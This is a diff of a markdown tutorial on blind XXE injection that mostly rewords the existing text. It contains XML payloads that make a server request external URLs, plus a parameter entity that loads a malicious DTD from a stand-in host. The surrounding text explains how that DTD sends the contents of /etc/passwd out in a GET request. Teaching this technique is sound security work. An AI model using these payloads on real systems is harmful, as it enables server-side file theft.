@@ -223,26 +223,26 @@ Basically, this is a critical vulnerability and should be fixed immediately.
 
 ## Blind XXE Injection
 
-**Blind XXE Injection** is an injection vulnerability where the results of an XXE Injection is not returned with the response by the application.
+**Blind XXE Injection** is an injection vulnerability where the results of an XXE Injection is not returned in the response, by the application.
 
 The vulnerability is complex as compared to other XXE vulnerabilities.
 
 ### Finding Blind XXE Injection using Out-Of-Band techniques
 
->Out-of-band technique involves the attacker to setup a remote server that they control and listen for any attacker caused network requests confirming that the exploit to the vulnerable application was successful.
+>Out-of-band technique involves the attacker to setup a remote server, that they control and listen for any **intentional network requests** which confirms that the exploit was successful.
 
-Finding Blind XXE Injection is similar to SSRF using XXE injection.
+Finding **Blind XXE Injection** is similar to **SSRF** using **XXE injection**.
 
 ```xml
-    <?xml version="1.0" encoding="UTF-8"?>
+  <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'https://my-targetsite.com'> &xxe;]>
 ```
 
-In the above payload we create a XML DTD that declares an **external entity** that has contents from our URL. Then we immediately reference the external entity which causes the parser to evaluate the URL.
+In the above payload we create a XML external entity whose contents are gathered from our URL. Then, we immediately use the external entity which causes the parser to evaluate the URL by sending a HTTP request.
 
-If the payload was successful we should see a HTTP GET request from the vulnerable server.
+If the payload was successful we should see a HTTP GET request sent by the webserver.
 
-In some cases using the regular entities are blocked by the parser in that situation, we could use XML parameter entities.
+>In some cases using the regular entities are blocked by the parser in that situation, we could use XML parameter entities.
 
 XML parameter entities are declared using the following syntax,
 
@@ -251,6 +251,8 @@ XML parameter entities are declared using the following syntax,
 ```
 
 `entity-name` is the name of the entity and `ENTITY VALUE HERE` is the value of the entity.
+
+They are reference using `%entity-name` in DTD.
 
 ### Using XML Parameter Entity for exploiting using Out-Of-Band
 
@@ -261,16 +263,16 @@ The previous piece of code using XML parameter entity will become,
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://my-targetsite.com"> %xxe;]>
 ```
 
-This would also result in similar behavior as of regular XML entities.
+This would also result in a HTTP request from the webserver to `https://my-targetsite.com`.
 
 ### Exfiltrate sensitive data using Blind XXE Injection
 
-It is possible to exfiltrate sensitive data using Blind XXE Injection using a technique we are going to discuss now.
+It is possible to exfiltrate sensitive data through Blind XXE Injection by using a technique we are going to discuss now.
 
-We need to do two things to achieve this,
+We need to do two things to exfiltrate data using blind XXE injection,
 
-1. First, we need to host a malicious DTD file that will take the *sensitive* file's contents and send a HTTP GET request to our remote server along with it.
-2. Second, we need to inject an external XML parameter entity that will refer to our malicious DTD stored in our site and load it.
+1. First, we need to host a malicious DTD file that will take the *sensitive* file's contents and then, send the contents of the file in a HTTP GET request to our remote server.
+2. Second, we need to inject an external XML parameter entity into the vulnerable webserver that will refer to our malicious DTD stored in our site and use it.
 
 The malicious DTD in our site will be,
 
@@ -283,17 +285,17 @@ The malicious DTD in our site will be,
 
 The DTD will carry out these tasks,
 
-1. Creates a XML **parameter** entity of name `file` that contains contents of file `/etc/passwd`.
-2. Another *dynamic XML parameter entity*, `eval` is created that contains *dynamic declaration* of another XML parameter entity called `exfiltrate`. Now, the exfiltrate will be evaluated by making a HTTP request to `https://target.site.com/?file=%file;` where `%file;` will be replaced with the contents of `file`, i.e. `/etc/passwd`.
+1. Creates a XML **parameter** entity with the name of `file` that contains the contents of file `/etc/passwd`.
+2. Creates another XML parameter entity `eval`, that contains *dynamic declaration* of another XML parameter entity called `exfiltrate`. Now, the `exfiltrate` will be evaluated by making a HTTP request to `https://target.site.com/?file=%file;` where `%file;` will be replaced with the contents of `file`, i.e. the contents of `/etc/passwd`.
 3. `eval` parameter entity is used, which causes dynamic declaration of `exfiltrate`.
-4. At last, `exfiltrate` is used which gets **evaluated** by sending a HTTP request to the server `https://target.site.com/?file=%file;` with the contents of `file` in the HTTP GET request parameter.
+4. At last, `exfiltrate` is used that gets **evaluated** by sending a HTTP request to the server `https://target.site.com/?file=%file;` with the contents of `file` in the HTTP GET request parameter.
 
-The main XML DTD that will trigger all these DTD actions must be sent to the vulnerable webserver,
+The XML external entity that will trigger all these DTD actions must be sent to the vulnerable webserver.
 
 ```xml
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://target.site.com/malicious.dtd"> %xxe;]>
 ```
 
-The above external entity will get our malicious DTD and then, evaluate it because of  `%xxe;` used in the end.
+The above external entity will get our malicious DTD available at `https://target.site.com/malicious.dtd` and then, evaluate it because, `xxe` is used in the end.
 
-If all went successfully we should see a HTTP GET request with the contents of `/etc/passwd` in the request parameter.
+If all ran successfully we should see a HTTP GET request with the contents of `/etc/passwd` in the request parameter.
